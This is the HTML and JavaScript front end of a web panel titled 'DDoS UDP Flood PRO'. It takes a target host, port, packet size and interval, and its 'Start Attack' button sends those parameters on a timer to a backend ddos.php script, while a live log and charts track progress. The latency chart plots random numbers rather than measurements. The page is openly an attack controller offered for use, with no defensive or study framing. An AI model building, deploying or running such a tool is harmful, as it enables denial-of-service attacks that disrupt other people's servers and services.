<!DOCTYPE html>
<html>
<head>
    <title>DDoS UDP Flood PRO</title>
    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
    <link rel="stylesheet" href="css/style.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
    <div id="ddos">
        <div class="step active" id="step1">
            <h2>Select Configuration</h2>
            <div class="buttons-group">
                <button onclick="lagConfig();nextStep(2);">Lag Configuration</button>
                <button onclick="trafficConfig();nextStep(2);">Traffic Configuration</button>
            </div>
        </div>
        <div class="step" id="step2">
            <h2>Fill Parameters</h2>
            <div class="form-grid">
                <div><label>Host:</label><input type="text" id="host"></div>
                <div><label>Port:</label><input type="number" id="port" value="80"></div>
                <div><label>Packet Count:</label><input type="number" id="packet"></div>
                <div><label>Time (s):</label><input type="number" id="time" value="5"></div>
                <div><label>Bytes:</label><input type="number" id="bytes" value="65000"></div>
                <div><label>Interval (ms):</label><input type="number" id="interval" value="10"></div>
                <div style="grid-column: span 2;"><label>Password:</label><input type="text" id="pass"></div>
            </div>
            <br/>
            <button onclick="prevStep(1)">Back</button>
            <button onclick="nextStep(3)">Next</button>
        </div>

        <div class="step" id="step3">
            <h2>Ready to Start</h2>
            <p>Check your parameters and start the attack.</p>
            <button onclick="prevStep(2)">Back</button>
            <button onclick="startWizardAttack()">Start Attack</button>
        </div>

        <div class="step" id="step4">
            <h2>Live Log</h2>
            <div class="live-container">
                <div class="live-log">
                    <textarea id="log" rows="20"></textarea>
                    <div class="total-size" id="totalSize">Total size: 0.00 KB</div>
                    <div class="attack-info" id="ipAddress">I'm connecting the server </div>
                    <div class="expiration-info" id="expirationCountdown"></div>
                    <div class="wide-button-group">
                        <button onclick="downloadLog()">Download Log</button>
                        <button id="toggleChart" onclick="toggleChartVisibility()">Hide Chart</button>
                        <button id="stopInterval" onclick="constantAttack(false)">Stop Attack</button>
                    </div>
                </div>

                <div class="live-params">
                    <h3>Live Parameters</h3>
                    <label>Packet Count:</label>
                    <input type="number" id="livePacket" min="1" value="100">
                    <label>Bytes:</label>
                    <input type="number" id="liveBytes" min="1" max="65000" value="65000">
                    <label>Interval (ms):</label>
                    <input type="number" id="liveInterval" min="1" max="10000" value="10">
                    <button onclick="applyLiveParams()">Apply Changes</button>
                </div>
            </div>
        </div>
    </div>

    <div id="networkChartContainer">
        <canvas id="networkChart"></canvas>
        <canvas id="latencyChart"></canvas>
    </div>

<script>

function nextStep(step){
    document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
    document.getElementById('step'+step).classList.add('active');
}
function prevStep(step){
    document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
    document.getElementById('step'+step).classList.add('active');
}
function startWizardAttack(){
    nextStep(4);
    document.getElementById('networkChartContainer').style.display="flex";
    initCharts();
    constantAttack(true);
}

function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};

function getCurrentDateTime(){var now=new Date();return now.getFullYear()+"/"+(now.getMonth()+1)+"/"+now.getDate()+" "+now.getHours()+":"+now.getMinutes()+":"+now.getSeconds();}
function scrollLogToBottom(){var log=document.getElementById("log");log.scrollTop=log.scrollHeight;}

var attackStartTime,totalSizeKB=0,intervalHandler=null;
var netChart,latChart;

function initCharts(){
    var ctx=document.getElementById('networkChart').getContext('2d');
    netChart=new Chart(ctx,{
        type:'line',
        data:{labels:[],datasets:[{label:'Network Speed (Kbps)',data:[],borderColor:'rgba(0,191,255,1)',backgroundColor:'rgba(0,191,255,0.2)',borderWidth:2}]},
        options:{scales:{x:{title:{display:true,text:'Time'}},y:{beginAtZero:true,title:{display:true,text:'Speed (Kbps)'}}}}
    });
    var ltx=document.getElementById('latencyChart').getContext('2d');
    latChart=new Chart(ltx,{
        type:'line',
        data:{labels:[],datasets:[{label:'Network Latency (ms)',data:[],borderColor:'rgba(255,99,132,1)',backgroundColor:'rgba(255,99,132,0.2)',borderWidth:2}]},
        options:{scales:{x:{title:{display:true,text:'Time'}},y:{beginAtZero:true,title:{display:true,text:'Latency (ms)'}}}}
    });
}

function fire(){
    var host=document.getElementById("host").value;
    var port=document.getElementById("port").value;
    var packet=document.getElementById("livePacket").value||document.getElementById("packet").value;
    var time=document.getElementById("time").value;
    var pass=document.getElementById("pass").value;
    var bytes=document.getElementById("liveBytes").value||document.getElementById("bytes").value;
    var interval=document.getElementById("liveInterval").value||document.getElementById("interval").value;
    var _log=document.getElementById("log");

    if(host!=""&&pass!=""){
        var url='./ddos.php?pass='+pass+'&host='+host+'&port='+port+'&time='+time+'&packet='+packet+'&bytes='+bytes+'&interval='+interval;
        microAjax(url,function(result){
            var logMessage=getCurrentDateTime()+"\n"+result+"\n";
            if(result.includes("Attack started")){attackStartTime=new Date();}
            if(result.includes("Attack finished")){
                var duration=((new Date()-attackStartTime)/1000).toFixed(2);
                logMessage+='Duration: '+duration+' seconds\n';
            }
            _log.value+=logMessage;
            updateTotalSize(bytes);
            updateCharts(bytes);
            scrollLogToBottom();
        });
    }
}

function constantAttack(status){
    var time=document.getElementById("time").value;
    var intervalTime=(time*1000)+1000;
    if(status){
        fire();
        intervalHandler=setInterval(fire,intervalTime);
    } else {
        clearInterval(intervalHandler);
        intervalHandler=null;
    }
}

function applyLiveParams(){
    var _log=document.getElementById("log");
    _log.value+=getCurrentDateTime()+"\n[Live Params Updated]\n";
    scrollLogToBottom();
}

function updateTotalSize(bytes){
    totalSizeKB+=(bytes/1024);
    document.getElementById("totalSize").textContent="Total size: "+totalSizeKB.toFixed(2)+" KB";
}
function downloadLog(){
    var logContent=document.getElementById("log").value;
    var blob=new Blob([logContent],{type:"text/plain;charset=utf-8"});
    var link=document.createElement("a");
    link.href=URL.createObjectURL(blob);
    link.download="log.txt";
    link.click();
}
function toggleChartVisibility(){
    var chartContainer=document.getElementById("networkChartContainer");
    var toggleButton=document.getElementById("toggleChart");
    if(chartContainer.style.display==="none"){chartContainer.style.display="flex";toggleButton.textContent="Hide Chart";}
    else{chartContainer.style.display="none";toggleButton.textContent="Show Chart";}
}

function updateCharts(bytes){
    var now=new Date();
    var label=now.getHours()+":"+now.getMinutes()+":"+now.getSeconds();
    if(netChart){
        netChart.data.labels.push(label);
        netChart.data.datasets[0].data.push((bytes/1024).toFixed(2));
        netChart.update();
    }
    if(latChart){
        latChart.data.labels.push(label);
        latChart.data.datasets[0].data.push(Math.floor(Math.random()*100));
        latChart.update();
    }
}

function lagConfig(){document.getElementById("packet").value="";document.getElementById("time").value="10";document.getElementById("bytes").value="1";document.getElementById("interval").value="0";}
function trafficConfig(){document.getElementById("packet").value="";document.getElementById("time").value="5";document.getElementById("bytes").value="65000";document.getElementById("interval").value="10";}
</script>
</body>
</html>

<?php
function getCurrentUrl() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $requestUri = $_SERVER['REQUEST_URI'];
    return $protocol . $host . $requestUri;
}
?>
